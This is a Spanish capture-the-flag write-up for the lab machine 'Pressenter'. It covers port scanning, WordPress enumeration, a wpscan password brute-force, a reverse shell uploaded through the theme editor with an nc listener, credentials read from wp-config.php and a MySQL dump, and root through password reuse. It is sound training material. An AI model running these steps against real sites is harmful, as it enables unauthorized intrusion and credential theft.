---
description: '✍️ Autor: d1se0  🔍 Dificultad: Fácil  📅 Fecha de creación: 29/08/2024'
---

# Pressenter

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (773).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 80** perteneciente al **servicio HTTP** está abierto por lo que a continuación se indagará más.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p80 -v 172.17.0.2
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (774).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web de CTF (está algo fea) puede ser que sea un WordPress.

<figure><img src="../../.gitbook/assets/image (775).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios y archivos con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,txt,xml
```

<figure><img src="../../.gitbook/assets/image (779).png" alt=""><figcaption></figcaption></figure>

Revisamos el código fuente y encontramos un dominio por lo que hay que añadirlo en el archivo `/etc/hosts`.

<figure><img src="../../.gitbook/assets/image (776).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (777).png" alt=""><figcaption></figcaption></figure>

Al ser un **WordPress** realizamos este comando para enumerar los usuarios y plugins.

```bash
wpscan --url http://pressenter.hl/ --enumerate u,vp
```

<figure><img src="../../.gitbook/assets/image (778).png" alt=""><figcaption></figcaption></figure>

Realizamos fuerza bruta a través de la misma herramienta.

```bash
wpscan --url http://pressenter.hl/ --passwords /usr/share/wordlists/rockyou.txt --usernames pressi,hacker
```

<figure><img src="../../.gitbook/assets/image (781).png" alt=""><figcaption></figcaption></figure>

Nos logueamos con esas credenciales.

<figure><img src="../../.gitbook/assets/image (780).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Estamos dentro vamos a la sección de **Herramientas** en concreto **Editor de archivos de temas** para subir la [**Reverse Shell**](https://www.revshells.com/).

<figure><img src="../../.gitbook/assets/image (782).png" alt=""><figcaption></figcaption></figure>

Al actualizar el archivo nos ponemos en escucha.

```bash
nc -lvnp 443
```

<figure><img src="../../.gitbook/assets/image (783).png" alt=""><figcaption></figcaption></figure>

Hacemos el [tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/) para trabajar más cómodos.

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar. No tenemos permisos SUDO.

<figure><img src="../../.gitbook/assets/image (784).png" alt=""><figcaption></figcaption></figure>

Encuentro en el directorio `/tmp` un archivo que no se puede leer si no soy el usuario **mysql** por lo que voy a mostrar el contenido de **wp-config.php**.

<figure><img src="../../.gitbook/assets/image (785).png" alt=""><figcaption></figcaption></figure>

```
cat /var/www/pressenter/wp-config.php
```

<figure><img src="../../.gitbook/assets/image (787).png" alt=""><figcaption></figcaption></figure>

Encontramos un usuario y su contraseña.

```
mysql -u admin -p'rooteable' -h 127.0.0.1
```

<figure><img src="../../.gitbook/assets/image (788).png" alt=""><figcaption></figcaption></figure>

Indagamos a ver si encontramos información relevante.

```bash
show databases;
use wordpress;
show tables;
select * from wp_usernames;
```

<figure><img src="../../.gitbook/assets/image (789).png" alt=""><figcaption></figcaption></figure>

Encontramos las credenciales del usuario **enter**. Nos logueamos.

<figure><img src="../../.gitbook/assets/image (790).png" alt=""><figcaption></figcaption></figure>

En el directorio del usuario hay una flag probablemente en el directorio root puede haber algo parecido por lo que realizamos este comando para escalar privilegios.

```bash
sudo /usr/bin/cat /root/root.txt
```

<figure><img src="../../.gitbook/assets/image (791).png" alt=""><figcaption></figcaption></figure>

No tenemos suerte, voy a probar una solución más sencilla y es la misma contraseña sea para root.

<figure><img src="../../.gitbook/assets/image (792).png" alt=""><figcaption></figcaption></figure>
